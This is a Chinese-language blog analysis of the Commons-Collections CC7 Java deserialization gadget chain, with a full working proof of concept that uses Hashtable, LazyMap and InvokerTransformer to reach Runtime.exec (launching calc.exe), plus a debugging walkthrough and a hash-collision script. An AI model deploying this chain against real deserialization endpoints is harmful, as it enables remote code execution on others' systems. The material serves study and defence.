## CommonsCollections_6

本机环境：

JDK版本：jdk1.7u_51

CC版本：Commons-Collections 3.2.1



CC7 依旧是寻找 LazyMap 的触发点，这次用到了 Hashtable。

看一下调用栈：

```
 Payload method chain:

    java.util.Hashtable.readObject
    java.util.Hashtable.reconstitutionPut
    org.apache.commons.collections.map.AbstractMapDecorator.equals
    java.util.AbstractMap.equals
    org.apache.commons.collections.map.LazyMap.get
    org.apache.commons.collections.functors.ChainedTransformer.transform
    org.apache.commons.collections.functors.InvokerTransformer.transform
    java.lang.reflect.Method.invoke
    sun.reflect.DelegatingMethodAccessorImpl.invoke
    sun.reflect.NativeMethodAccessorImpl.invoke
    sun.reflect.NativeMethodAccessorImpl.invoke0
    java.lang.Runtime.exec
```

## POC&复现

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CommonCollections7 {
    public static void main(String[] args) throws IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException {

        Transformer[] fakeTransformers = new Transformer[] {};

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class}, new String[] {"calc.exe"}),
        };

        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
        lazyMap1.put("yy", 1);


        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
        lazyMap2.put("zZ", 1);
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 2);

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);

        lazyMap2.remove("yy");
        // ==================
        // 生成序列化字符串
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(hashtable);
        oos.close();

        // 本地测试触发
        // System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object) ois.readObject();
    }
}
```

![image-20220719161147842](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220719161147842.png)

## 调试分析

### Hashtable

Hashtable 与 HashMap 十分相似，是一种 key-value 形式的哈希表，但仍然存在一些区别：

- HashMap 继承 AbstractMap，而 Hashtable 继承 Dictionary ，可以说是一个过时的类。
- 两者内部基本都是使用“数组-链表”的结构，但是 HashMap 引入了红黑树的实现。
- Hashtable 的 key-value 不允许为 null 值，但是 HashMap 则是允许的，后者会将 key=null 的实体放在 index=0 的位置。
- Hashtable 线程安全，HashMap 线程不安全。

Hashtable 的 readObject 方法中，最后调用了 `reconstitutionPut` 方法将反序列化得到的 key-value 放在内部实现的 Entry 数组 table 里。这里的key与value就是我们自己存进去的。

![image-20220719161736069](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220719161736069.png)



如果这里hash与之前某个存入的相等那就会调用其`equals`方法。

![image-20220719162244181](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220719162244181.png)

跟进 `AbstractMap#equals `方法，发现在红框处的 m 其实就是我们之前传入的 key，所以 m 如果可控的话，我们就可以触发`LazyMap#get` 从而 RCE

![image-20220719162721737](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220719162721737.png)

接下来我们分析一下poc的构造原理：

首先创建两个具有碰撞哈希值的LazyMap，以便在readObject期间强制进行元素比较。

```java
Map innerMap1 = new HashMap();
Map innerMap2 = new HashMap();

Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
lazyMap1.put("yy", 1);


Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
lazyMap2.put("zZ", 1);
Hashtable hashtable = new Hashtable();
hashtable.put(lazyMap1, 1);
hashtable.put(lazyMap2, 2);

Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
f.setAccessible(true);
f.set(transformerChain, transformers);

lazyMap2.remove("yy");
```

- 为什么这里 hashtable 要 put 两次

主要目的是为了进入触发点，由于第一次put时候会把 key 和 value 存入 tab 中（这里的 tab 就是 reconstitutionPut 函数传入的 table），在第一次 put 的时候由于 tab 的内容为 null 导致不会进入 for 循环。

![image-20220719163740601](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220719163740601.png)

由于第一次 put 将数值存入了 tab ，所以第二次 put 时就会进入 for 循环，来到我们的触发点

- 为什么 put 的值一定要 yy 和 zZ

主要目的是让两次hash相等，由于我们put了两次，那么在reconstitutionPut函数中index也会计算两次，如果第一次和第二次计算出来的 hash 值不同，那么 index 就会不同，就会导致在第二次中 tab 中会找不到值，从而 e 为 null，自然不会进入 for 循环。

为什么要put这两个值，这是因为在 java 中这两者的 hashCode 是相同的。

![image-20220719164908674](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220719164908674.png)

我们可以看一下hashcode的实现

```java
 public synchronized int hashCode() {
        int h = 0;
        if (count == 0 || loadFactor < 0)
            return h;  // Returns zero

        loadFactor = -loadFactor;  // Mark hashCode computation in progress
        Entry[] tab = table;
        for (Entry<K,V> entry : tab)
            while (entry != null) {
                h += entry.hashCode();
                entry = entry.next;
            }
        loadFactor = -loadFactor;  // Mark hashCode computation complete

        return h;
    }
```

跟进

```java
 public int hashCode() {
            return (Objects.hashCode(key) ^ Objects.hashCode(value));
        }
```

由于value的值相同，这里我们关注key即可，之后会调类的hashCode，也就是**String类的hashCode**

```java
public static int hashCode(Object o) {
        return o != null ? o.hashCode() : 0;
    }
```

看一下`String.java`，基于ascii来算hash

![image-20220719170821098](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220719170821098.png)

传入的yy和zZ都是两位数，所以计算两次

- yy：第一次y的ascii121，第二次31*121+121=3872
- zZ：第一次z的ascii122，第二次31*122+90=3872

因此只要满足以上公式的字符串都能够绕过，用python跑一下：

```python
import string
letter = string.ascii_uppercase+string.ascii_lowercase


def hashcode(string_expected):
    return 31 * ord(string_expected[0]) + ord(string_expected[1])


for i in letter:
    for j in letter:
        for k in letter:
            for l in letter:
                str1 = i+j
                str2 = k+l
                if str1 != str2:
                    if hashcode(str1) == hashcode(str2):
                        print(hashcode(str1), str1, str2, sep=" ")
```

那么为何这里不能传入两个相同的值？	这样的话reconstitutionPut只会被调用一次，不能触发后续利用。

- 为什么最后要 remove ，而且为什么这里 remove("yy")

这里我们删除remove看看，发现lazyMap2多了一个键，并且反序列化无法触发了

![image-20220719171803099](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220719171803099.png)

在生成 payload 的过程中，调用 `this.factory.transform` 的时候 ，由于我们是反射进行赋值的，所以这里只有一个空的 Transformer数组，同时传入的 key 为 yy，所以这里只会返回 yy，也就是这里的 value 是 yy ，也就是说把yy写入lazpMap2了。

而反序列化时：在AbstractMap有比较lazyMap1和2大小是否相等的部分，如果不把yy删除了就会导致比较失败返回false

![image-20220719172717995](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220719172717995.png)



